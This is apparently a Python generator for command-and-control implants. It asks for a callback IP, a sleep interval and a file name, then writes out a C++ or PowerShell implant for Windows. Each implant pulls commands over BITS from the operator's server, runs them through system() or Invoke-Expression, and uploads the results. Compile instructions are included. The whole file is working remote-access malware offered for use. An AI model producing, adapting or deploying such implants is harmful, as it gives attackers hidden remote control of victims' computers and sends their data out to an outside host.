import os

def gen(lang):
#def generate_implant(lang, ip_address, output_file):
    ip = input("[implant] Specify the IP of the server to call back to: ")
    s_time = input("[implant] How long would you like the implant to sleep (seconds): ")
    out_file = input("[implant] What would you like to name your implant (extension will be added): ")

    if lang == "cpp":

        c_code = f'''

#include <windows.h>
#include <bits.h>
#include <filesystem>
#include <iostream>
#include <fstream>
#include <string>
#include <unistd.h>

namespace fs = std::filesystem;

#define COMMAND_URL L"http://{ip}/commands/command.json"
#define UPLOAD_URL L"http://{ip}/uploads/response.txt"
#define NOTIFY_URL L"http://{ip}/notify"
#define IMPLANT_NAME L"{out_file}"

std::string get_local_command_file()
{{
    return fs::temp_directory_path().string() + "command.json";
}}

std::string get_local_result_file()
{{
    return fs::temp_directory_path().string() + "response.txt";
}}

std::wstring get_local_command_file_wstring()
{{
    return std::wstring(fs::temp_directory_path().wstring() + L"command.json");
}}

std::wstring get_local_result_file_wstring()
{{
    return std::wstring(fs::temp_directory_path().wstring() + L"response.txt");
}}

std::string extractCommandFromJson(const std::string& json) {{
    size_t start = json.find("\\"command\\"");
    if (start == std::string::npos) {{
        return "";
    }}

    start = json.find(":", start);
    if (start == std::string::npos) {{
        return "";
    }}

    start = json.find("\\"", start) + 1; 
    size_t end = json.find("\\"", start); 

    if (start == std::string::npos || end == std::string::npos) {{
        return "";
    }}

    return json.substr(start, end - start);
}}

std::string readCommandFromFile(const std::string& filePath) {{
    std::ifstream file(filePath);
    if (!file.is_open()) {{
        return "";
    }}

    std::string jsonContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    return extractCommandFromJson(jsonContent);
}}

// Initialize COM
HRESULT InitializeCOM() {{
    return CoInitializeEx(NULL, COINIT_MULTITHREADED);
}}

// Create BITS manager
HRESULT CreateBITSManager(IBackgroundCopyManager** pManager) {{
    return CoCreateInstance(__uuidof(BackgroundCopyManager), NULL, CLSCTX_LOCAL_SERVER,
                            __uuidof(IBackgroundCopyManager), (void**)pManager);
}}

// Download file using BITS
HRESULT DownloadFile(IBackgroundCopyManager* pManager) {{
    IBackgroundCopyJob* pJob = NULL;
    GUID jobId;

    HRESULT hr = pManager->CreateJob(L"DownloadJob", BG_JOB_TYPE_DOWNLOAD, &jobId, &pJob);
    if (SUCCEEDED(hr)) {{
        std::wstring localCommandFile = get_local_command_file_wstring();
        hr = pJob->AddFile(COMMAND_URL, localCommandFile.c_str());
        if (SUCCEEDED(hr)) {{
            pJob->Resume();
        }} else {{
            return 1;
        }}

        BG_JOB_STATE state;
        do {{
            Sleep(1000);
            pJob->GetState(&state);
        }} while (state == BG_JOB_STATE_TRANSFERRING);

        if (state == BG_JOB_STATE_TRANSFERRED) {{
            pJob->Complete();
        }} 
        pJob->Release();
    }} else {{
        return 1;
    }}
    return hr;
}}

// Upload file using BITS
HRESULT UploadFile(IBackgroundCopyManager* pManager) {{
    IBackgroundCopyJob* pJob = NULL;
    GUID jobId;

    HRESULT hr = pManager->CreateJob(L"UploadJob", BG_JOB_TYPE_UPLOAD, &jobId, &pJob);
    if (SUCCEEDED(hr)) {{
        std::wstring localResultFile = get_local_result_file_wstring();
        hr = pJob->AddFile(UPLOAD_URL, localResultFile.c_str());
        if (FAILED(hr)) {{
            pJob->Release();
            return hr;
        }}

        hr = pJob->Resume();
        if (FAILED(hr)) {{
            pJob->Release();
            return hr;
        }}

        BG_JOB_STATE state;
        do {{
            Sleep(1000);
            pJob->GetState(&state);
        }} while (state == BG_JOB_STATE_TRANSFERRING);

        if (state == BG_JOB_STATE_TRANSFERRED) {{
            hr = pJob->Complete();
        }}
        pJob->Release();
    }} else {{
        return 1;
    }}
    return hr;
}}

// Execute the command
void executeCommand(const std::string& command) {{
    if (command.empty()) {{
        return;
    }}

    std::string resultFile = get_local_result_file();

    // Execute the command and redirect output to result file
    std::string fullCommand = command + " > " + resultFile + " 2>&1";
    int returnCode = system(fullCommand.c_str());
}}

// Notify
HRESULT NotifyServer(IBackgroundCopyManager* pManager, const std::wstring& notifyUrl, const std::string& identifier) {{
    std::wstring localNotifyFile = fs::temp_directory_path().wstring() + L"notify.txt";
    std::wofstream notifyFile(localNotifyFile, std::ios::out);
    if (notifyFile.is_open()) {{
        notifyFile << "identifier=" << identifier << std::endl;
        notifyFile.close();
}} else {{
    return E_FAIL;
}}

IBackgroundCopyJob* pJob = NULL;
GUID jobId;

HRESULT hr = pManager->CreateJob(L"NotifyJob", BG_JOB_TYPE_UPLOAD, &jobId, &pJob);
if (SUCCEEDED(hr)) {{
    hr = pJob->AddFile(notifyUrl.c_str(), localNotifyFile.c_str());
    if (SUCCEEDED(hr)) {{
        pJob->Resume();
    }}

    BG_JOB_STATE state;
    do {{
        Sleep(1000);
        pJob->GetState(&state);
    }} while (state == BG_JOB_STATE_TRANSFERRING);

    if (state == BG_JOB_STATE_TRANSFERRED) {{
        hr = pJob->Complete();
    }}
    pJob->Release();
}}

    // Clean temp file
    _wremove(localNotifyFile.c_str());
    return hr;
}}

// Main function
int main() {{

    std::wstring implantName = IMPLANT_NAME;
    std::string identifier(implantName.begin(), implantName.end());
    std::wstring notifyUrl = NOTIFY_URL;
    HRESULT hr;
    IBackgroundCopyManager* pManager = NULL;

    hr = InitializeCOM();
    if (FAILED(hr)) {{
        return 1;
    }}

    hr = CreateBITSManager(&pManager);
    if (FAILED(hr)) {{
        CoUninitialize();
        return 1;
    }}
    NotifyServer(pManager, notifyUrl, identifier);

    while(1){{
        HRESULT hr;
        IBackgroundCopyManager* pManager = NULL;

        hr = InitializeCOM();
        if (FAILED(hr)) {{
            return 1;
        }}

        hr = CreateBITSManager(&pManager);
        if (FAILED(hr)) {{
            CoUninitialize();
            return 1;
        }}

        // Download command file
        if (SUCCEEDED(DownloadFile(pManager))) {{
            std::string LOCAL_COMMAND_FILE = get_local_command_file();
            std::string command = readCommandFromFile(LOCAL_COMMAND_FILE);
            executeCommand(command);
        }}

        // Upload result file
        if (FAILED(UploadFile(pManager))) {{
        }}

        if (pManager) pManager->Release();
        CoUninitialize();
        sleep({s_time});
    }}
    return 0;
}}
'''

        with open(f"./implants/{out_file}.cpp","w") as f:
            f.write(c_code)
        print(f"[+] Implant has been generated and saved to: ./implants/{out_file}.cpp")
        print(f"[*] Compile on Windows with 'g++ -o {out_file}.exe {out_file}.cpp -lole32 -lws2_32 -lruntimeobject -luuid'")

    elif lang == "ps1":

        ps1_code = f'''
$command_url = "http://{ip}/commands/command.json"
$upload_url = "http://{ip}/uploads/response.txt"
$local_command_file = "$Env:temp\\command.json"
$local_result_file = "$Env:temp\\response.txt"

function Download-Command {{
    try {{
        Start-BitsTransfer -Source $command_url -Destination $local_command_file -ErrorAction Stop
    }} catch {{
        exit
    }}
}}

function Execute-Command {{
    if (Test-Path $local_command_file) {{
        $CommandData = Get-Content $local_command_file | ConvertFrom-Json
        try {{
            $ExecutionResult = Invoke-Expression $CommandData.command 2>&1
            $ExecutionResult | Out-File -FilePath $local_result_file -Encoding utf8
        }} catch {{
            "Error: $_" | Out-File -FilePath $local_result_file -Encoding utf8
        }}
    }} else {{
        exit
    }}
}}

function Upload-Result {{
    if (Test-Path $local_result_file) {{
        try {{
            Start-BitsTransfer -Source $local_result_file -Destination $upload_url -TransferType UploadReply -ErrorAction Stop
            Remove-Item -Path $local_result_file -Force
        }} catch {{
            exit
        }}
    }} else {{
        exit
    }}
}}

function Main {{
    while ($true) {{
        Download-Command
        Execute-Command
        Upload-Result
        Remove-Item $local_command_file
        Start-Sleep -Seconds {s_time}
    }}
}}

Main
        '''
        with open(f"./implants/{out_file}.ps1","w") as f:
            f.write(ps1_code)
        print(f"[+] Implant has been generated and saved to: ./implants/{out_file}.ps1")
